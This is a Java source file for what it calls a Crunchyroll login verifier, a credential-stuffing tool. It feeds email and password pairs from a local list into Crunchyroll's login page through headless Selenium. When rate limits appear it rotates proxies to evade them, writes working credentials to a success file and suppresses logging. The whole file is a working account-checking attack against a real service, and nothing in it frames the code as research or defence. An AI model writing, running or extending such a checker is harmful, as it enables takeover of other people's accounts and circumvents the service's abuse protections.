package es.srshiroh;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.HashSet;
import java.util.Collections;
import java.util.logging.Logger;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

public class LoginTester {

    private static final String CREDENTIALS_FILE_PATH = "C:\\Users\\Shiroh\\Documents\\try.txt";
    private static final String SUCCESS_FILE_PATH = "C:\\Users\\Shiroh\\Documents\\CrunchyChecker\\exit.txt";
    private static final String FAILED_FILE_PATH = "C:\\Users\\Shiroh\\Documents\\CrunchyChecker\\fail.txt";
    private static final boolean USE_HEADLESS_MODE = true;
    private static final int MAX_PROXY_RETRIES = 3; // Máximo número de proxies a intentar por credencial

    private static int successCount = 0;
    private static int failCount = 0;
    private static final List<String> successfulEmails = new ArrayList<>();
    private static final List<String> failedEmails = new ArrayList<>();
    private static ProxyManager proxyManager;

    static {
        LogManager.getLogManager().reset();
        Logger globalLogger = Logger.getLogger("");
        globalLogger.setLevel(Level.OFF);

        System.setProperty("java.util.logging.config.file", "");
        System.setProperty("java.util.logging.SimpleFormatter.format", "");

        Logger.getLogger("org.openqa.selenium").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.devtools").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.devtools.CdpVersionFinder").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.chromium").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.chromium.ChromiumDriver").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.remote").setLevel(Level.OFF);
        Logger.getLogger("org.openqa.selenium.remote.http").setLevel(Level.OFF);

        System.setProperty("webdriver.chrome.silentOutput", "true");
        System.setProperty("webdriver.edge.silentOutput", "true");
        System.setProperty("org.seleniumhq.selenium.logging.disable", "true");

        System.setErr(new PrintStream(new ByteArrayOutputStream()));
    }

    public static void main(String[] args) {
        System.out.println("╔══════════════════════════════════════════════════════════╗");
        System.out.println("║                                                          ║");
        System.out.println("║        🌟 CRUNCHYROLL LOGIN VERIFIER 🌟                 ║");
        System.out.println("║           Con Soporte de Proxies 🔄                     ║");
        System.out.println("║                                                          ║");
        System.out.println("╚══════════════════════════════════════════════════════════╝");

        // Inicializar ProxyManager
        System.out.println("🔧 Inicializando sistema de proxies...");
        proxyManager = new ProxyManager();

        if (proxyManager.getProxyCount() > 0) {
            System.out.println("✅ Sistema de proxies activado con " + proxyManager.getProxyCount() + " proxies disponibles");
        } else {
            System.out.println("⚠️ No hay proxies disponibles, continuando sin proxy");
        }

        Set<String> alreadyTested = new HashSet<>();
        alreadyTested.addAll(loadCredentials(SUCCESS_FILE_PATH));
        alreadyTested.addAll(loadCredentials(FAILED_FILE_PATH));

        List<CredentialExtractor.UserCredential> credentials = CredentialExtractor.extractCredentials(CREDENTIALS_FILE_PATH);

        if (credentials.isEmpty()) {
            System.out.println("❌ No se encontraron credenciales válidas");
            return;
        }

        List<CredentialExtractor.UserCredential> filtered = new ArrayList<>();
        for (CredentialExtractor.UserCredential credential : credentials) {
            if (!alreadyTested.contains(credential.getEmail())) {
                filtered.add(credential);
            }
        }

        if (filtered.isEmpty()) {
            System.out.println("🎉 Todas las credenciales ya han sido probadas");
            return;
        }

        System.out.println("🚀 Iniciando pruebas con " + filtered.size() + " credenciales secuencialmente");
        System.out.println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

        for (int i = 0; i < filtered.size(); i++) {
            CredentialExtractor.UserCredential credential = filtered.get(i);
            processCredentialWithProxyRetry(credential, i + 1, filtered.size());

            if (i < filtered.size() - 1) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }

        printSummary(filtered.size());
    }

    private static void processCredentialWithProxyRetry(CredentialExtractor.UserCredential credential, int current, int total) {
        AuthenticationResult finalResult = null;
        ProxyManager.ProxyInfo currentProxy = null;
        int proxyAttempts = 0;
        boolean rateLimitDetected = false;

        // Primer intento sin proxy
        try (SeleniumLoginService service = new SeleniumLoginService(USE_HEADLESS_MODE)) {
            finalResult = service.performLogin(credential.getEmail(), credential.getPassword());

            if (finalResult.getErrorMessage() != null && finalResult.getErrorMessage().startsWith("RATE_LIMIT:")) {
                rateLimitDetected = true;
                System.out.println("⚠️ [" + current + "/" + total + "] Límite de solicitudes detectado para: " + credential.getEmail());
            }
        } catch (Exception e) {
            System.out.println("❌ Error procesando " + credential.getEmail() + " sin proxy: " + e.getMessage());
        }

        // Si se detectó límite de solicitudes y hay proxies disponibles, intentar con proxies
        if (rateLimitDetected && proxyManager.getValidProxyCount() > 0) {
            System.out.println("🔄 Intentando con proxies para: " + credential.getEmail());

            while (proxyAttempts < MAX_PROXY_RETRIES && proxyManager.getValidProxyCount() > 0) {
                proxyAttempts++;
                currentProxy = proxyManager.getNextProxy();

                if (currentProxy == null) {
                    System.out.println("❌ No hay más proxies válidos disponibles");
                    break;
                }

                System.out.println("🔄 [" + current + "/" + total + "] Intento " + proxyAttempts + " con proxy " + currentProxy + " para: " + credential.getEmail());

                try (SeleniumLoginService service = new SeleniumLoginService(USE_HEADLESS_MODE, currentProxy)) {
                    finalResult = service.performLogin(credential.getEmail(), credential.getPassword());

                    // Evaluar el resultado y marcar el proxy apropiadamente
                    if (finalResult.getErrorMessage() == null || !finalResult.getErrorMessage().startsWith("RATE_LIMIT:")) {
                        // Proxy funcionó correctamente
                        proxyManager.markProxyAsValid(currentProxy);
                        System.out.println("✅ Proxy " + currentProxy + " funcionó correctamente para: " + credential.getEmail());
                        break;
                    } else {
                        // Proxy también tiene límite de solicitudes
                        proxyManager.markProxyAsFailure(currentProxy);
                        System.out.println("⚠️ Proxy " + currentProxy + " también tiene límite de solicitudes para: " + credential.getEmail());
                    }
                } catch (Exception e) {
                    // Error con el proxy - marcarlo como inválido
                    proxyManager.markProxyAsInvalid(currentProxy);
                    System.out.println("❌ Error procesando " + credential.getEmail() + " con proxy " + currentProxy + ": " + e.getMessage());
                    finalResult = new AuthenticationResult(credential.getEmail(), false, "Error con proxy: " + e.getMessage());
                }

                // Pequeña pausa entre intentos de proxy
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }

            // Mostrar estado actual de proxies después de los intentos
            if (proxyAttempts > 0) {
                proxyManager.printProxyStatus();
            }
        }

        // Procesar el resultado final
        if (finalResult != null) {
            String proxyInfo = currentProxy != null ? " (usando proxy " + currentProxy + ")" : "";

            if (finalResult.isSuccess()) {
                successCount++;
                successfulEmails.add(credential.getEmail());
                System.out.println("✅ [" + current + "/" + total + "] LOGIN EXITOSO: " + credential.getEmail() + proxyInfo);
                saveCredential(SUCCESS_FILE_PATH, credential.getEmail(), credential.getPassword(), "");
            } else {
                failCount++;
                failedEmails.add(credential.getEmail());

                String errorMsg = finalResult.getErrorMessage();
                if (errorMsg != null && errorMsg.startsWith("RATE_LIMIT:")) {
                    System.out.println("🚫 [" + current + "/" + total + "] LÍMITE ALCANZADO: " + credential.getEmail() + " - " + errorMsg + proxyInfo);
                } else {
                    System.out.println("❌ [" + current + "/" + total + "] LOGIN FALLIDO: " + credential.getEmail() + " - " + errorMsg + proxyInfo);
                }

                if (errorMsg != null &&
                    (errorMsg.toLowerCase().contains("permanece en página de login") ||
                     errorMsg.toLowerCase().contains("contraseña incorrecta") ||
                     errorMsg.startsWith("RATE_LIMIT:"))) {
                    saveCredential(FAILED_FILE_PATH, credential.getEmail(), credential.getPassword(), errorMsg);
                }
            }
        } else {
            failCount++;
            failedEmails.add(credential.getEmail());
            System.out.println("❌ [" + current + "/" + total + "] ERROR PROCESANDO: " + credential.getEmail());
        }
    }

    private static Set<String> loadCredentials(String filePath) {
        Set<String> emails = new HashSet<>();
        try {
            Files.createDirectories(Paths.get(filePath).getParent());
            if (Files.exists(Paths.get(filePath))) {
                for (String line : Files.readAllLines(Paths.get(filePath))) {
                    String[] parts = line.split(":", 2);
                    if (parts.length >= 2) emails.add(parts[0].trim());
                }
            }
        } catch (IOException e) {
            System.out.println("❌ Error cargando " + filePath + ": " + e.getMessage());
        }
        return emails;
    }

    private static synchronized void saveCredential(String filePath, String email, String password, String error) {
        try {
            Files.createDirectories(Paths.get(filePath).getParent());
            String line = error.isEmpty() ?
                email + ":" + password + System.lineSeparator() :
                email + ":" + password + ":" + error + System.lineSeparator();
            Files.write(Paths.get(filePath), line.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException e) {
            System.out.println("❌ Error guardando: " + e.getMessage());
        }
    }

    private static void printSummary(int total) {
        double rate = total > 0 ? (successCount * 100.0 / total) : 0;

        System.out.println();
        System.out.println("╔══════════════════════════════════════════════════════════════════════╗");
        System.out.println("║                          🎯 RESUMEN FINAL                           ║");
        System.out.println("╠══════════════════════════════════════════════════════════════════════╣");
        System.out.println("║ 📊 Total probadas: " + String.format("%-51s", total) + "║");
        System.out.println("║ ✅ Exitosas: " + String.format("%-57s", successCount) + "║");
        System.out.println("║ ❌ Fallidas: " + String.format("%-57s", failCount) + "║");
        System.out.println("║ 🚀 Tasa de éxito: " + String.format("%-50s", String.format("%.2f%%", rate)) + "║");
        if (proxyManager.getProxyCount() > 0) {
            System.out.println("║ 🔄 Proxies utilizados: " + String.format("%-47s", proxyManager.getProxyCount()) + "║");
        }
        System.out.println("╚══════════════════════════════════════════════════════════════════════╝");

        if (!successfulEmails.isEmpty()) {
            System.out.println();
            System.out.println("╔══════════════════════════════════════════════════════════════════════╗");
            System.out.println("║                      ✅ CUENTAS EXITOSAS                            ║");
            System.out.println("╚══════════════════════════════════════════════════════════════════════╝");
            for (String email : successfulEmails) {
                System.out.println("✅ " + email);
            }
        }

        if (!failedEmails.isEmpty()) {
            System.out.println();
            System.out.println("╔══════════════════════════════════════════════════════════════════════╗");
            System.out.println("║                      ❌ CUENTAS FALLIDAS                            ║");
            System.out.println("╚══════════════════════════════════════════════════════════════════════╝");
            for (String email : failedEmails) {
                System.out.println("❌ " + email);
            }
        }

        System.out.println();
        if (successCount > 0) {
            System.out.println("🎉 ¡Credenciales válidas encontradas!");
        } else {
            System.out.println("🔍 No se encontraron credenciales válidas.");
        }

        if (proxyManager.getProxyCount() > 0) {
            System.out.println("🔄 Sistema de proxies activo - Se rotaron proxies automáticamente cuando se detectaron límites.");
        }
    }
}
